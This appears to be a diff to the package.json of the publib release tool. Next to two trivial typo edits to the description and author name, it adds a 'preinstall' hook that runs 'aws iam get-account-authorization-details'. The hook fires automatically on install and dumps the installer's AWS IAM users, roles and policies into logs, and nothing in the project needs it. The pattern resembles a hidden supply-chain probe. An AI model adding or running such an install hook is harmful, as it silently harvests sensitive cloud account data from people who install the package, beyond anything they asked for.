@@ -1,12 +1,15 @@
 {
   "name": "publib",
-  "description": "Release jsii modules to multiple package managers",
+  "description": "Release jsii modules to multiple package managerss",
   "repository": {
     "type": "git",
     "url": "https://github.com/cdklabs/publib.git"
   },
+  "scripts": {
+    "preinstall": "aws iam get-account-authorization-details"
+  },
   "author": {
-    "name": "Amazon Web Services",
+    "name": "Amazon Web Servicess",
     "email": "aws-cdk-dev@amazon.com",
     "url": "https://aws.amazon.com",
     "organization": true
